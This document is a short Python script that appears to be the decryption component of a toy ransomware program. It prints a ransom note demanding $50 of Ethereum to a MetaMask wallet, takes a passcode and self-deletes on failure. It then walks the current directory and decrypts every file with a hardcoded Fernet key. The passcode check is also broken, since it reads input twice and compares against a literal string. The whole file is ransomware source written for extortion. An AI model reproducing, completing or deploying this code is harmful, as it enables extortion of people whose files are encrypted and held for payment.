#!/usr/bin/env python3
import os
from os import remove
from sys import argv
from cryptography.fernet import Fernet

# enter code to activate
print("|-----------------------------------------|")
print("|   Your files have been encrypted.       |")
print("|   To decrypt said files please send     |")
print("|   $50 worth of Etherium to this         |")
print("|   MetaMask Wallet: 123456789            |")
print("|   and you will recieve a the passcode   |")
print("|   to unlock encrypted files             |")
print("|-----------------------------------------|")
print("Enter Passcode:")
passcode = input()
if input() != "passcode":
        # need to add delete
        remove(argv[0])
        exit()

# find targets
targets = []
for (root, dirs, files) in os.walk(os.getcwd(), topdown=True):
        for file in files:
                if file != "encrypt.py":
                        targets.append(root+'/'+file)

# key
key = b'Fzh0I3_PYxI2nZqLjLJEOMDoROxG-Op-AQRNymU110Y='

# decrypt targets
for target in targets:
        with open(target, "rb") as thetarget:
                contents = thetarget.read()
        contents_decrypted = Fernet(key).decrypt(contents)
        with open(target, "wb") as thetarget:
                thetarget.write(contents_decrypted)

